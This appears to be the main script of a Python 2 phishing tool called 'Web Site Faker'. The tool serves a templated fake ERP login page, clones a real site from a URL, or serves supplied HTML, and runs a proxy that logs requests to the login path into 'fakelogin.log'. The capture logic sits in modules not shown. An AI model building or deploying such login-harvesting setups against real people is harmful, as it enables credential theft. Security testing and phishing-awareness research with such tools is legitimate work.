#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import os
import sys
import argparse
import logging


from web import FakeWeb
from proxy import ProxyServer, ProxyHandler
from common import init_logger

import IPython


def run_proxy(url, path, port):
    '''Run proxy'''
    logging.info("Start running proxy...")
    ps = ProxyServer(url, path, port)
    ps.run()


def run_tmpl(args):
    '''Run template website'''
    with open("index_tmpl.html", "rb") as ri:
        tmpl = ri.read()
        index = tmpl.replace("ERP系统", args.title)
        with open("index.html", "wb") as wi:
            wi.write(index)
            logging.info("Generate new index success.")

    FakeWeb.index = "index.html"
    url = FakeWeb.run(args.debug)
    run_proxy(url, "/login", args.port)


def run_clone(args):
    '''Run clone mode'''
    if args.ext:
        sys.path.append(os.path.dirname(args.ext))
        ProxyHandler.ext_file = os.path.basename(args.ext)

    # ProxyHandler.path = args.path
    run_proxy(args.url, args.path, args.port)


def run_spec(args):
    '''Run spec website file mode'''
    FakeWeb.workdir = args.wwwroot
    url = FakeWeb.run(args.debug)
    run_proxy(url, args.path, args.port)


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Web Site Faker.\t-\tCode by Hmiyc")
    subparsers = parser.add_subparsers(help='Running mode.')
    parser.add_argument("--debug", default=False, action="store_true", help="Enable debug mode.")
    parser.add_argument("--port", default=80, type=int, help="The proxy listen port.")

    tmpl_parser = subparsers.add_parser('tmpl', help="Use default template.")
    tmpl_parser.add_argument("title", type=str, help="Web site title.")
    tmpl_parser.set_defaults(func=run_tmpl)

    clone_parser = subparsers.add_parser('clone', help="Clone web site from url.")
    clone_parser.add_argument("url", type=str, help="Url to clone.")
    clone_parser.add_argument("--path", type=str, default="login", help="Request path to be logged.")
    clone_parser.add_argument("--ext", type=str, help="Extends (.py).")
    clone_parser.set_defaults(func=run_clone)

    spec_parser = subparsers.add_parser('spec', help="Use specified web site file.")
    spec_parser.add_argument("wwwroot", type=str, help="Web site html file.")
    spec_parser.add_argument("--path", type=str, default="login", help="Request path to be logged.")
    spec_parser.set_defaults(func=run_spec)

    args = parser.parse_args()
    init_logger("fakelogin.log", args.debug)
    args.func(args)

    IPython.embed()
